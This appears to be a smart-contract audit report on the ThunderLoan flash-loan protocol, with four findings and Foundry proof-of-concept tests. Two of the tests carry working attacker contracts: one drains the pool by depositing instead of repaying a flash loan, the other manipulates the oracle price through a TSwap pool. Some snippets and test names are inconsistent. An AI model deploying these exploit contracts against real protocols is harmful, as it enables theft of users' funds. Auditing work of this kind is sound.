### [H-1] Erroneous `ThunderLoan::updateExchange` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate

**Description** In the ThunderLoan system, the `exchangeRate` is responsible for calculating the exchange rate between asset tokens and underlying tokens. In a way it's responsible for keeping track of how many fees to give liquidity providers.

However, the `deposit` function updates this rate without collecting any fees!

``` solidity 
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

        // @audit- high: we shouldnt be updating the exchange rate here  
    ->  // uint256 calculatedFee = getCalculatedFee(token, amount);
    ->  // assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }

```

**Impact** There are several impacts to this bug.

1. The `redeem` function is blocked, because the protocol thinks the amount to be redeemed is more than it's balance.
2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less than they deserve.


**Proof of Concepts** There are several impacts to this bug.

1. The `redeem` function is blocked, because the protocol thinks the amount to be redeemed is more than it's balance.
2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less than they deserve.

``` solidity 
    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        
        vm.stopPrank(); 

        uint256 amountToRedeem = type(uint256).max;
        
        vm.startPrank(liquidityProvider);

        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```

**Recommended mitigation** Remove the incorrect updateExchangeRate lines from `deposit`

``` diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

        // @audit- high: we shouldnt be updating the exchange rate here  
    -   uint256 calculatedFee = getCalculatedFee(token, amount);
    -   assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }

```






### [H-2] By calling a flashloan and then ThunderLoan::deposit instead of ThunderLoan::repay users can steal all funds from the protocol

**Description:** By calling the deposit function to repay a loan, an attacker can meet the flashloan's repayment check, while being allowed to later redeem their deposited tokens, stealing the loan funds.

**Impact:** This exploit drains the liquidity pool for the flash loaned token, breaking internal accounting and stealing all funds.

**Proof of Concept:**

1. Attacker executes a `flashloan`
2. Borrowed funds are deposited into `ThunderLoan` via a malicious contract's `executeOperation` function
3. `Flashloan` check passes due to check vs starting AssetToken Balance being equal to the post deposit amount
4. Attacker is able to call `redeem` on `ThunderLoan` to withdraw the deposited tokens after the flash loan as resolved.

Add the following to ThunderLoanTest.t.sol and run `forge test --mt testUseDepositInsteadOfRepayToStealFunds`


<summary>Proof of Code</summary>

``` solidity 
    function testUseDeposit() public setAllowedToken hasDeposits {
        // instead of repaying use deposit 
        
        uint256 amount = 50e18;
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amount);
        
        
        vm.startPrank(user);
        tokenA.mint(address(dor), fee);
        
        thunderLoan.flashloan(address(dor), tokenA, amount, "");
        
        dor.redeemMoney();
        
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > fee);
    }



contract DepositOverRepay is IFlashLoanReceiver {
    
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/) external returns (bool) {

        s_token = IERC20(token);

        assetToken = thunderLoan.getAssetFromToken(IERC20(token));

        s_token.approve(address(thunderLoan), amount + fee);
        
        thunderLoan.deposit(IERC20(token), amount + fee);
        
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }    
}

```

**Recommended Mitigation:** ThunderLoan could prevent deposits while an AssetToken is currently flash loaning.


``` diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+      if (s_currentlyFlashLoaning[token]) {
+          revert ThunderLoan__CurrentlyFlashLoaning();
+      }
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

        uint256 calculatedFee = getCalculatedFee(token, amount);
        assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }

```



### [H-3] Mixing up variable location causes storage collisions in ThunderLoan::s_flashLoanFee and ThunderLoan::s_currentlyFlashLoaning

**Description:** `ThunderLoan.sol` has two variables in the following order:

``` solidity  

        uint256 private s_feePrecision;
        uint256 private s_flashLoanFee; // 0.3% ETH fee

```

However, the expected upgraded contract `ThunderLoanUpgraded.sol` has them in a different order.

``` solidity 
        uint256 private s_flashLoanFee; // 0.3% ETH fee
        uint256 public constant FEE_PRECISION = 1e18;

```

Due to how Solidity storage works, after the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the positions of storage variables when working with upgradeable contracts.


**Impact:** After upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally the `s_currentlyFlashLoaning` mapping will start on the wrong storage slot.



**Proof of Code:**

<summary>Proof of Code</summary>
Add the following code to the `ThunderLoanTest.t.sol` file.

``` solidity 

    // You'll need to import `ThunderLoanUpgraded` as well
    import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

    function testUpgradeBreaks() public {
            uint256 feeBeforeUpgrade = thunderLoan.getFee();
            vm.startPrank(thunderLoan.owner());
            ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
            thunderLoan.upgradeTo(address(upgraded));
            uint256 feeAfterUpgrade = thunderLoan.getFee();

            assert(feeBeforeUpgrade != feeAfterUpgrade);
        }

```

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`


**Recommended Mitigation:** Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant. In `ThunderLoanUpgraded.sol`:


``` diff 

-    uint256 private s_flashLoanFee; // 0.3% ETH fee
-    uint256 public constant FEE_PRECISION = 1e18;
+    uint256 private s_blank;
+    uint256 private s_flashLoanFee;
+    uint256 public constant FEE_PRECISION = 1e18;

```




### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attacks

**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:** Liquidity providers will drastically reduced fees for providing liquidity.

**Proof of Concept:** The following all happens in 1 transaction.

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `fee1`. During the flash loan, they do the following:
   1. User sells 1000 `tokenA`, tanking the price.
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 `tokenA`.
      1. Due to the fact that the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper.

``` solidity 
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
->      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }

```


<summary>Proof of Code:</summary>

``` solidity 
    function testOracle() public {
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");

        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));

        // create a TSwap DEX between WETH / Token A 
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. fund tswap 
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        // ratio 100 weth : 100 token A -> 1:1
        vm.stopPrank();

        // 3. fund thunder loan w/ money 
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        // fund thunder loan as this amount will be the amount that is used to conduct the flash loan
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();
        // 100 weth & 100 tokenA in TSwap 
        // 1000 tokenA in thunderLoan to borrow 

        // 4. we are going to take out 2 flash loans
        // now will take out a flashloan tanking the price 

        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal Fee is: %s", normalFeeCost);
        //   Normal Fee is:     0.296147410319118389
        //   After 2nd loan:    0.214167600932190305

        uint256 amountToBorrow = 50e18;

        MaliciousContract flr = new MaliciousContract(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");

        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("attack fee", attackFee);
        assert(attackFee < normalFeeCost);

            // a. to nuke the price of the weth/ tokenA on tswap
            // b. to show that doing so greatly reduces the fees we pay on thunder load 
    }


// 1. swap tokenA borrowed for weth
// 2. take out another flash loan, to show the difference

contract MaliciousContract is IFlashLoanReceiver {
    
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;

    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    // 1. swap token A borrowed for weth

    // 2. take out anothyer flash loan to show the difference 

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;

    }

    function executeOperation(address token, uint256 amount, uint256 fee, address initiator, bytes calldata params) external returns (bool) {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            // this will tank the price
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // call another flashloan to get tokens at a discount
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // repay 
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
         }
         else { 
            feeTwo = fee;
            // repay 
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
         }
         return true;
    }
}

```

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.

</details>

